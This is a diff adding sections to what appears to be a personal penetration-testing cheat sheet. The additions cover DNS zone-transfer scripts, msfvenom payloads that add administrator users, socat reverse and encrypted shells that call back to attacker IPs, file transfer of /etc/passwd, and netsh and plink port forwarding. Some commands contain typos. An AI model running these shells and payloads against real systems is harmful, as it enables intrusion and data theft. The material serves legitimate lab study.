@@ -100,7 +100,7 @@ int main(int argc, char *argv[])
 }
 ```
 
-## Chisel
+## chisel
 
 * `chisel server --socks5 -p 8000 --reverse`
 * `chisel client <chisel server IP>:<PORT> R:socks`
@@ -140,6 +140,37 @@ Searching in **_Windows_** using the `dir` command we have the following switche
 * `dir /s /q /a:sh /p C:\Windows` Lists any files and directories in __C:\Windows__, and any of its subdirectories `/s`, which have both the "hidden" and "system" file attributes `/a:sh`. Also, lists the owner of the file `/q`, and pauses after each screen of output `/p`
 * `dir \ /s | find "i" | more` the above command uses vertical bars to pipe the output from dir to the command find, and then to the command more. The result is a list of all files and directories in the root directory of the current drive (\), with extra information. Namely, find also displays the number of files in each directory, and the amount of space occupied by each
 * `dir /s /a:hs /q C:\Windows > myfile.txt` runs the _dir_ command, but redirects the output to the file __myfile.txt__, instead of displaying it on the screen. To view the contents of the file, you can use the `type` command and your file name, if the file is very long try it with `type myfile.txt | more`
+
+## DNS
+
+* `dig axfr master.thinc.local @10.1.1.112`
+* `host www.example.com`
+* `host -t mx example.com`
+* build possible hostnames to list.txt then `for ip in $(cat list.txt);do host $ip.example.com;done` can use seclists as well web-discovery DNS list
+* reverse lookup bruteforce: `for ip in $(seq 50 100);do host 38.100.193.$ip;done | grep -v "not found"`
+* Zone transfer: `host -l example.com ns1.example.com`
+* finding nameservers: `host -t ns example.com | cut -d " " -f 4`
+* with script:
+
+```
+#!/bin/bash
+
+#Simple Zone Transfer Bash Script
+#$1 is the first argument given after the bash script
+#Check if argument was given, if not, print usage
+
+if [ -z "$1" ]; then
+	echo "[*] Simple Zone Transfer Script"
+	echo "[*] Usage: $0 <domain name>"
+	exit 0
+fi
+
+# if argument was given, identify the DNS servers for the domain
+
+for server in $(host -t ns $1 | cut -d " " -f4);do
+	host -l $1 $server | grep "has address"
+done
+```
 
 ## Docker & Juice Shop
 This is how you install **_Docker_** on Kali for whatever you need, I run my Juice Shop app to test for the OWASP Top10 on Docker:
@@ -242,11 +273,26 @@ Cracking some SHA256 hashes with john, using the rockyou.txt as a wordlist, redi
 
 * `john <hashes.txt> --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 > johncracked.txt`
 
+## metasploit
+
+* port forward: `portfwd add -L 0.0.0.0 -l 8888 -p 8080 -r 127.0.0.1`
+
+## mount
+
+* `mount -t nsf Mtarget IP>:/home/username /mnt/folder -nolock`
+
 ## msfvenom
 
 * *_Windows add user:_* `msfvenom -p windows/adduser USER=hacker PASS=Password123! -f exe -o hackware.exe`
 
 * _add user to the local administrator group:_ `msfvenom -p windows/x64/exec CMD="net localgroup Administrators <username> /add" -f exe -o mysqld.exe`
+
+## netsh / Windows
+
+* **port forwarding:** Remember to add a firewall rule, +IP Helper from Services must be enabled and Ethernet properties, Internet Protocol Version 6 -> ON `netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110`
+* **netsh add firewall rule:** `netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow`
+* **find listening port:** `netstat -anp TCP | find "4455"`
+
 
 ## nmap
 If you need to generate a nice html report from the output you can use *_xsltproc_*:
@@ -334,6 +380,29 @@ If you are interested in more depth on this matter check out the cyberchef's web
 * load the created ticket into memory and then use psexec to get a shell on the target machine
 * `Rubeus.exe ptt /ticket:ticket.kirbi`
 * `PsExec.exe \\dc01.krbtown.local cmd`
+
+## socat
+
+* `socat -d -d TCP-LISTEN:1234 -`
+* `socat -d -d TCP-CONNECT:127.0.0.1:1234 -`
+* **port forwarding:** `socat TCP:LISTEN::80,fork,reuseaddr TCP:<IP>:<PORT>`
+* **transferring files:**
+	* `socat -d -d TCP-LISTEN:1234 OPEN:filetransfer.txt,create`
+	* `socat -d -d TCP-CONNECT:127.0.0.1:1234 FILE:/etc/passwd`
+* **listener for reverse shell:** `socat -d -d TCP-LISTEN:443 STDOUT`
+* **executing commands on Win:**
+	* `socat -d -d TCP-LISTEN:1234 EXEC:'cmd.exe',pipes`
+* **executing cmd exe from Win to connect back to kali:** 
+	* `socat TCP4:192.168.119.198:443 EXE: `
+* **encrypted reverse shell:** `socat -d -d OPENSSL-LITEN:5557,cert=bind)shell.pem,verify=0,fork STDOUT`
+* **connecting back with encryption from Windows:** `socat OPENSSL:192.168.119.198:5556,verify=0 EXEC:'cmd.exe',pipes`
+* **if victim was a Linux machine this is the synthax:** `socat OPENSSL:192.168.168.1:4443,verify=0 EXEC:/bin/bash`
+* you also have to generate a certificate first, see more details **[here](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)**
+
+## ssh
+
+* from rev shell with plink: `cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.10.10.12:1234:127.0.0.1:3306 10.10.10.12`
+* from RDP session: `plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
 
 ## sql
 
